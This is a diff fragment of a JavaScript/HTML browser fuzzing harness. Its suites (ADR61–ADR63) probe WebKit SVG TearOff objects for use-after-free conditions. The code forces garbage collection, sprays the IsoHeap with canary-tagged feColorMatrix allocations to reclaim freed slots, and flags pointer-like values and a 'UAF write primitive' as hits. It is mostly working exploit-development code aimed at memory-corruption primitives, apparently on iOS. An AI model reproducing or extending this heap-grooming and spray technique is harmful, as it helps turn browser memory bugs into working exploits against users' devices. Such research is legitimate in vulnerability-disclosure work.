+        }catch(e){L('ADR60 T4: avRefs['+i+'] THROW after rapid setAttr','warn');}
+      }
+
+      ctx.svg.remove();
+    },100);
+  },200);
 };
 
 // ═══════════════════════════════════════════════════════════════
-// ADR58 — replaceItem race: old TearOff after item replacement
-// SVGNumberList.replaceItem(newItem, index) replaces index with newItem.
-// What happens to the OLD item's TearOff?
+// ADR61 — animVal TearOff after setAttributeNS removes animation source
 //
-// In WebKit, replaceItem:
-//   1. Creates new SVGNumber or reuses existing
-//   2. Replaces the list entry at index
-//   3. The old SVGNumber's refcount drops by 1 (list drops its ref)
-//   4. If old TearOff holds RefPtr → old SVGNumber lives
+// From ADR55: setAttributeNS invalidates TearOff cache.
+// From ADR57: animVal TearOffs are DIFFERENT per frame (per-frame alloc).
 //
-// Extended test: replaceItem 100 times while holding old TearOff.
-// Then free all refs. Does old TearOff see zero, original, or latest?
+// Combined test: during animation, collect animVal TearOff T_anim.
+// Then call setAttributeNS → this changes the values attribute.
+// SMIL's "from" was based on old values — new attribute string might
+// RESET the animation or CHANGE what it interpolates.
 //
-// BONUS: does replaceItem re-allocate in IsoHeap?
-// Pattern: alloc → get TearOff → replaceItem → old TearOff = ?
-// If old TearOff.value = 0: freed and zeroed (IsoHeap zero-on-free)
-// If old TearOff.value = ORIGINAL: TearOff's RefPtr kept it alive
-// If old TearOff.value = REPLACED: in-place update (same C++ object)
+// Key: does T_anim (animVal TearOff from before setAttr) read:
+//   a) Its frozen animated value (like ADR55's bv TearOffs)
+//   b) The new animated value after setAttr
+//   c) ZERO (freed C++ animated SVGNumber)
+//   d) Garbage (dangling raw ptr)
+//
+// Also: T_base (baseVal TearOff) after setAttributeNS:
+//   - Should behave like ADR55: reads OLD base value
+//
+// Extended: compare T_anim vs T_base values across multiple rounds
 // ═══════════════════════════════════════════════════════════════
-suites['ADR58']=function(){
-  L('ADR58: replaceItem race — old TearOff after item replacement','info');
-  var svg=makeSVG();
-  var defs=document.createElementNS(SVG_NS,'defs');svg.appendChild(defs);
-  var vals=[];for(var i=0;i<20;i++)vals.push(i===0?12345:i);
-  var fe=makeFeWith20(svg,defs,12345);
-  var bv=fe.values.baseVal;
+suites['ADR61']=function(){
+  L('ADR61: animVal + baseVal TearOffs after rapid setAttributeNS cycles','info');
+  var ctx=makeLiveAnimatedFilter('f61',5000,0,10);
 
-  var oldItem=bv.getItem(0);
-  L('ADR58 T1 oldItem.value='+oldItem.value,'info');
+  setTimeout(function(){
+    var av=ctx.fe.values.animVal;
+    var bv=ctx.fe.values.baseVal;
 
-  // Create a new number to replace with
-  var svg2=makeSVG();
-  var defs2=document.createElementNS(SVG_NS,'defs');svg2.appendChild(defs2);
-  var fe2=makeFeWith20(svg2,defs2,99999);
-  var newItem=fe2.values.baseVal.getItem(0);
+    // Collect animVal and baseVal TearOffs mid-animation
+    var avTear=av.getItem(0);
+    var bvTear=bv.getItem(0);
+    var avVal=avTear.value;
+    var bvVal=bvTear.value;
 
-  L('ADR58 T1: newItem.value='+newItem.value,'info');
+    L('ADR61 T0: avTear='+avVal.toFixed(2)+' bvTear='+bvVal.toFixed(2),'info');
 
-  // replaceItem at index 0
-  try{
-    var result=bv.replaceItem(newItem,0);
-    L('ADR58 T1 after replaceItem: result.value='+result.value,'info');
-    L('ADR58 T1: oldItem.value='+oldItem.value+' (was 12345)','info');
-    L('ADR58 T1: oldItem===result? '+(oldItem===result),'info');
-    L('ADR58 T1: bv.getItem(0).value='+bv.getItem(0).value,'info');
+    var rounds=[];
 
-    if(oldItem.value===99999){
-      L('ADR58 T1: IN-PLACE update (same C++ SVGNumber, new value written)','warn');
-    } else if(oldItem.value===12345){
-      L('ADR58 T1: old TearOff kept ORIGINAL value (RefPtr kept old SVGNumber alive)','info');
-    } else if(oldItem.value===0){
-      L('ADR58 T1: ZERO — freed and zeroed','miss');
-    } else {
-      L('ADR58 T1: ★ UNEXPECTED: '+oldItem.value+' bits='+f32hex(oldItem.value),'warn');
+    // Run 10 setAttributeNS cycles, each time check old TearOffs
+    var roundCount=0;
+    function doRound(){
+      if(roundCount>=10){summary();return;}
+      var newVals=[];
+      for(var i=0;i<20;i++) newVals.push(i===0?(roundCount+1)*10000:0);
+      ctx.fe.setAttributeNS(null,'values',newVals.join(' '));
+
+      // Read IMMEDIATELY after setAttr
+      var avNow, bvNow, freshAv;
+      try{avNow=avTear.value;}catch(e){avNow='THROW:'+e.message;}
+      try{bvNow=bvTear.value;}catch(e){bvNow='THROW:'+e.message;}
+      try{freshAv=av.getItem(0).value;}catch(e){freshAv='THROW:'+e.message;}
+
+      rounds.push({r:roundCount,av:avNow,bv:bvNow,fav:freshAv});
+      roundCount++;
+      setTimeout(doRound,0); // next tick, not next frame
     }
 
-    // T2: rapid replaceItem 200 times, old TearOff held throughout
-    L('ADR58 T2: 200 rapid replaceItem cycles holding oldItem TearOff','info');
-    var oldItem2=bv.getItem(0); // fresh ref to current item[0]
-    for(var i=0;i<200;i++){
-      var tmpSvg=document.createElementNS(SVG_NS,'svg');
-      document.body.appendChild(tmpSvg);
-      var tmpFe=document.createElementNS(SVG_NS,'feColorMatrix');
-      tmpFe.setAttribute('type','matrix');
-      var tmpVals=[];for(var j=0;j<20;j++)tmpVals.push(i===j?i*111:0);
-      tmpFe.setAttribute('values',tmpVals.join(' '));
-      tmpSvg.appendChild(tmpFe);
-      var tmpItem=tmpFe.values.baseVal.getItem(0);
-      bv.replaceItem(tmpItem,0);
-      tmpSvg.remove();
+    function summary(){
+      L('ADR61: round results (avTear/bvTear/freshAv per cycle):','info');
+      rounds.forEach(function(r){
+        var avv=(typeof r.av==='number')?r.av.toFixed(2):r.av;
+        var bvv=(typeof r.bv==='number')?r.bv.toFixed(2):r.bv;
+        var fvv=(typeof r.fav==='number')?r.fav.toFixed(2):r.fav;
+        L('  R'+r.r+': av='+avv+' bv='+bvv+' freshAv='+fvv,'info');
+        if(typeof r.av==='number' && isPointerLike32(f32bits(r.av)))
+          L('  ★★★ R'+r.r+' avTear POINTER-LIKE: '+f32hex(r.av),'hit');
+        if(typeof r.bv==='number' && isPointerLike32(f32bits(r.bv)))
+          L('  ★★★ R'+r.r+' bvTear POINTER-LIKE: '+f32hex(r.bv),'hit');
+      });
+
+      // Final values
+      try{L('ADR61 final: avTear='+avTear.value.toFixed(2)+' bvTear='+bvTear.value.toFixed(2),'info');}
+      catch(e){L('ADR61 final: TearOff THROW: '+e.message,'miss');}
+
+      // Check if avTear froze at initial value (like ADR55 orphans)
+      // or if it continued updating
+      if(typeof avTear.value==='number'){
+        if(Math.abs(avTear.value-avVal)<1){
+          L('ADR61: avTear FROZEN at initial animated value '+avVal.toFixed(2),'warn');
+          L('ADR61: → animVal TearOff orphaned SAME as baseVal TearOff (ADR55 confirmed for animVal)','info');
+        } else {
+          L('ADR61: avTear CHANGED from initial ('+avVal.toFixed(2)+' → '+avTear.value.toFixed(2)+')','warn');
+        }
+      }
+      ctx.svg.remove();
     }
-    L('ADR58 T2: after 200 replaces: oldItem.value='+oldItem.value+' oldItem2.value='+oldItem2.value,'info');
-    L('ADR58 T2: current bv[0]='+bv.getItem(0).value,'info');
 
-    // T3: full DOM removal while holding
-    fe.remove();svg.remove();
-    L('ADR58 T3: after full remove: oldItem='+oldItem.value+' oldItem2='+oldItem2.value,'info');
-    var ob=f32bits(oldItem.value);
-    var ob2=f32bits(oldItem2.value);
-    if(isPointerLike32(ob))L('★★ ADR58 T3: oldItem POINTER-LIKE: '+f32hex(oldItem.value),'hit');
-    if(isPointerLike32(ob2))L('★★ ADR58 T3: oldItem2 POINTER-LIKE: '+f32hex(oldItem2.value),'hit');
+    setTimeout(doRound,0);
+  },200);
+};
 
-  }catch(e){L('ADR58 replaceItem err: '+e.message,'miss');}
-  svg2.remove();
+// ═══════════════════════════════════════════════════════════════
+// ADR62 — Release per-frame animVal TearOff WHILE animation ticking
+//
+// From ADR57: each animation frame allocates a NEW C++ SVGNumber
+// for the animated value. Each collected TearOff holds RefPtr to
+// its per-frame SVGNumber.
+//
+// KEY HYPOTHESIS: The SMIL engine might also hold an internal pointer
+// to the "current animated list" while computing the next frame.
+// If that pointer is a RAW POINTER (not RefPtr), and we release the
+// TearOff between frames, the SVGNumber might be freed while SMIL
+// still holds its raw pointer.
+//
+// Test: collect T[0] from frame 0. Wait for frame 1. RELEASE T[0].
+// Force GC to actually free the C++ SVGNumber.
+// Wait for SMIL to run frame 2.
+// Check: did anything crash? Did SMIL write to a freed address?
+//
+// Also: allocate a fresh feColorMatrix C right after releasing T[0].
+// C's SVGNumber might land at the freed address.
+// Then force SMIL to tick again.
+// Check C's SVGNumber for unexpected writes (would be SMIL writing to it via dangling ptr).
+// ═══════════════════════════════════════════════════════════════
+suites['ADR62']=function(){
+  L('ADR62: Release animVal TearOff between frames — UAF window test','info');
+  var ctx=makeLiveAnimatedFilter('f62',2000,0,8);
+
+  setTimeout(function(){
+    L('ADR62: animation started, collecting T[0]...','info');
+    var t0=null;
+    var t0val=null;
+
+    // Collect T[0] on first tick
+    requestAnimationFrame(function(){
+      t0=ctx.fe.values.animVal.getItem(0);
+      t0val=t0.value;
+      L('ADR62: T[0] collected, value='+t0val.toFixed(3),'info');
+
+      // Wait one more rAF frame before releasing
+      requestAnimationFrame(function(){
+        var t1val=ctx.fe.values.animVal.getItem(0).value;
+        L('ADR62: frame+1 animVal='+t1val.toFixed(3)+' (animation ticking: '+(Math.abs(t1val-t0val)>0.1)+')', 'info');
+
+        // RELEASE T[0]
+        var t0ref=t0;
+        t0=null;
+        t0val=null;
+
+        // Force GC to process the release
+        gcHard();
+
+        L('ADR62: T[0] released + gcHard done','info');
+
+        // Immediately alloc a fresh SVGNumber C (might land at freed T[0] address)
+        var cSvg=document.createElementNS(SVG_NS,'svg');
+        document.body.appendChild(cSvg);
+        var cFe=document.createElementNS(SVG_NS,'feColorMatrix');
+        cFe.setAttribute('type','matrix');
+        var cVals=[];for(var i=0;i<20;i++)cVals.push(i===0?55555:0);
+        cFe.setAttribute('values',cVals.join(' '));
+        cSvg.appendChild(cFe);
+        var cTear=cFe.values.baseVal.getItem(0);
+        L('ADR62: alloc C immediately after T[0] release: C.value='+cTear.value,'info');
+
+        // Wait for SMIL to tick again (should write new animated value somewhere)
+        requestAnimationFrame(function(){
+          var t2val=ctx.fe.values.animVal.getItem(0).value;
+          L('ADR62: frame+2 (after release+alloc) animVal='+t2val.toFixed(3),'info');
+
+          // CRITICAL: Check if C's SVGNumber was written to by SMIL
+          var cAfter=cTear.value;
+          L('ADR62: C.value after SMIL tick='+cAfter,'info');
+          if(cAfter!==55555){
+            if(cAfter===0){
+              L('★★ ADR62: C.value=ZERO — IsoHeap freed the slot and zero-on-free applies','warn');
+            } else {
+              L('★★★ ADR62: C.value CHANGED TO '+cAfter.toFixed(3)+' bits='+f32hex(cAfter),'hit');
+              L('★★★ ADR62: SMIL wrote to our freshly allocated SVGNumber!','hit');
+              L('★★★ ADR62: This is the UAF write primitive!','hit');
+            }
+          } else {
+            L('ADR62: C.value still 55555 (SMIL did not write to it)','info');
+          }
+
+          // Also: did t0ref (the released TearOff, now possibly dangling) do anything?
+          try{
+            var t0After=t0ref.value;
+            L('ADR62: released T[0] still readable? value='+t0After.toFixed(3)+' bits='+f32hex(t0After),'warn');
+            if(isPointerLike32(f32bits(t0After))){
+              L('★★★ ADR62: released TearOff reads POINTER-LIKE: '+f32hex(t0After),'hit');
+            }
+          }catch(e){L('ADR62: released T[0] THROW (expected): '+e.message,'info');}
+
+          cSvg.remove();
+          ctx.svg.remove();
+        });
+      });
+    });
+  },200);
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR63 — IsoHeap spray: per-frame SVGNumber free/reuse oracle
+//
+// This is the most systematic test of IsoHeap reuse patterns.
+//
+// Setup:
+//   1. Alloc 50 "sentinel" feColorMatrix elements (each item[0] = unique canary)
+//      These land in IsoHeap as a baseline.
+//   2. Run animation for 50 frames, collecting TearOffs T[0]...T[49]
+//      These are 50 consecutive per-frame SVGNumber allocs.
+//   3. Release ALL collected TearOffs simultaneously → 50 SVGNumber slots freed
+//   4. Force GC
+//   5. Alloc 50 "probe" feColorMatrix elements (each item[0] = probe canary)
+//      These MIGHT reuse the freed per-frame slots.
+//   6. Check sentinel values: did any sentinel value change?
+//      (Would mean probe landed adjacent to sentinel, maybe overlapping)
+//   7. Check probe values: all should be their canary values.
+//      (Any change would mean address collision with animated SVGNumbers)
+//
+// Key measurement: are the 50 freed per-frame SVGNumber IsoHeap slots
+// reused IMMEDIATELY for the 50 new probe allocations?
+// (LIFO vs FIFO free list? Bump-only on iOS?)
+// ═══════════════════════════════════════════════════════════════
+suites['ADR63']=function(){
+  L('ADR63: IsoHeap spray oracle — per-frame alloc → free → reuse pattern','info');
+
+  // Step 1: Sentinel allocs
+  var SENTINEL_BASE=77770000;
+  var sentinelFes=[];
+  for(var i=0;i<50;i++){
+    var sSvg=document.createElementNS(SVG_NS,'svg');
+    document.body.appendChild(sSvg);
+    var sFe=document.createElementNS(SVG_NS,'feColorMatrix');
+    sFe.setAttribute('type','matrix');
+    var sVals=[];for(var j=0;j<20;j++)sVals.push(j===0?(SENTINEL_BASE+i):0);
+    sFe.setAttribute('values',sVals.join(' '));
+    sSvg.appendChild(sFe);
+    sentinelFes.push({svg:sSvg,fe:sFe,t:sFe.values.baseVal.getItem(0),canary:SENTINEL_BASE+i});
+  }
+  L('ADR63: 50 sentinels allocated (canaries '+SENTINEL_BASE+' to '+(SENTINEL_BASE+49)+')','info');
+
+  // Step 2: Start animation and collect 50 per-frame TearOffs
+  var ctx=makeLiveAnimatedFilter('f63',3000,0,6);
+  var frameTearOffs=[];
+  var frameCount=0;
+
+  setTimeout(function(){
+    function collectFrames(){
+      var t=ctx.fe.values.animVal.getItem(0);
+      frameTearOffs.push(t);
+      frameCount++;
+      if(frameCount<50) requestAnimationFrame(collectFrames);
+      else afterCollect();
+    }
+    requestAnimationFrame(collectFrames);
+  },100);
+
+  function afterCollect(){
+    L('ADR63: 50 per-frame TearOffs collected, range: '+
+      frameTearOffs[0].value.toFixed(1)+' to '+
+      frameTearOffs[49].value.toFixed(1),'info');
+
+    // Verify all different
+    var allDiff=true;
+    for(var i=1;i<frameTearOffs.length;i++){
+      if(frameTearOffs[i]===frameTearOffs[0]){allDiff=false;break;}
+    }
+    L('ADR63: all different TearOffs? '+allDiff,'info');
+
+    // Step 3: Release ALL 50 frame TearOffs at once
+    var savedFirst=frameTearOffs[0];
+    var savedLast=frameTearOffs[49];
+    var savedFirstVal=savedFirst.value;
+    var savedLastVal=savedLast.value;
+    frameTearOffs=null; // release all 50
+
+    // Step 4: Force GC
+    gcFull();
+    L('ADR63: 50 frame TearOffs released + gcFull done','info');
+
+    // Verify sentinels still intact before probe allocs
+    var sentinelOK=true;
+    for(var i=0;i<sentinelFes.length;i++){
+      var sv=sentinelFes[i].t.value;
+      if(Math.abs(sv-sentinelFes[i].canary)>0.5){
+        L('★ ADR63: SENTINEL['+i+'] CORRUPTED! was '+sentinelFes[i].canary+' now '+sv,'hit');
+        sentinelOK=false;
+      }
+    }
+    if(sentinelOK) L('ADR63: all 50 sentinels intact before probe allocs','info');
+
+    // Step 5: Probe allocs
+    var PROBE_BASE=88880000;
+    var probeFes=[];
+    for(var i=0;i<50;i++){
+      var pSvg=document.createElementNS(SVG_NS,'svg');
+      document.body.appendChild(pSvg);
+      var pFe=document.createElementNS(SVG_NS,'feColorMatrix');
+      pFe.setAttribute('type','matrix');
+      var pVals=[];for(var j=0;j<20;j++)pVals.push(j===0?(PROBE_BASE+i):0);
+      pFe.setAttribute('values',pVals.join(' '));
+      pSvg.appendChild(pFe);
+      probeFes.push({svg:pSvg,fe:pFe,t:pFe.values.baseVal.getItem(0),canary:PROBE_BASE+i});
+    }
+    L('ADR63: 50 probes allocated','info');
+
+    // Step 6: Check sentinels for corruption
+    var corruptSentinels=0;
+    for(var i=0;i<sentinelFes.length;i++){
+      var sv=sentinelFes[i].t.value;
+      if(Math.abs(sv-sentinelFes[i].canary)>0.5){
+        L('★ ADR63: SENTINEL['+i+'] CORRUPTED after probe alloc! was '+sentinelFes[i].canary+' now '+sv,'hit');
+        corruptSentinels++;
+      }
+    }
+    if(corruptSentinels===0) L('ADR63: all sentinels intact (no overlap with probe allocs)','info');
+
+    // Step 7: Check probe values
+    var corruptProbes=0;
+    for(var i=0;i<probeFes.length;i++){
+      var pv=probeFes[i].t.value;
+      if(Math.abs(pv-probeFes[i].canary)>0.5){
+        L('★ ADR63: PROBE['+i+'] unexpected value '+pv+' (canary was '+probeFes[i].canary+')','warn');
+        corruptProbes++;
+      }
+    }
+    if(corruptProbes===0) L('ADR63: all 50 probes have correct canary values','info');
+
+    // savedFirst and savedLast: did they survive being "released"?
+    // (If JS didn't actually GC them, RefPtrs still held)
+    L('ADR63: savedFirst (still held by JS).value='+savedFirst.value.toFixed(2)+
+      ' (was '+savedFirstVal.toFixed(2)+'): '+(Math.abs(savedFirst.value-savedFirstVal)<1?'PRESERVED':'CHANGED!'),'info');
+    L('ADR63: savedLast (still held by JS).value='+savedLast.value.toFixed(2)+
+      ' (was '+savedLastVal.toFixed(2)+'): '+(Math.abs(savedLast.value-savedLastVal)<1?'PRESERVED':'CHANGED!'),'info');
+
+    L('ADR63: NOTE: if IsoHeap is BUMP-ONLY on iOS (no free list reuse), probes land AFTER frame allocs','info');
+    L('ADR63: if IsoHeap has free list, probes MIGHT reuse frame slots','info');
+
+    // Cleanup
+    sentinelFes.forEach(function(x){x.svg.remove();});
+    probeFes.forEach(function(x){x.svg.remove();});
+    ctx.svg.remove();
+  }
 };
 </script>
 </body>
